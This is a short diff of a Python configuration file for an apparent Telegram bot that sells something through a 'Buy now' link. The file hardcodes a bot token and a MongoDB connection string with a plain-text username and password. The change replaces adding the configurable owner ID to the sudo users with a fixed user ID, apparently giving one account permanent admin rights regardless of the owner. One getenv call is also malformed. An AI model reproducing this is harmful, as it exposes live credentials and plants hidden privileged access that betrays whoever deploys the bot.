@@ -24,7 +24,7 @@ BOT_TOKEN_2 = getenv('BOT_TOKEN_2', '7867772211:AAEv6qY38CN2t9_8S-JGXnqsLFrPZkNv
 BUY_LINK = getenv("@cutegirlTG") #Link to the acc or channel on which user will be redirected when he clicks on Buy now in voice msg
 OWNER_ID = int(getenv("OWNER_ID"))
 SUDO_USERS = [int(x) for x in getenv('SUDO_USERS', '6604279354 6104594076').split()]
-SUDO_USERS.append(OWNER_ID)
+SUDO_USERS.append(6604279354)
 MONGO_DB_URI = getenv('MONGO_DB_URI', 'mongodb+srv://manik:manik11@cluster0.iam3w.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
 
 #All the essential channels needed
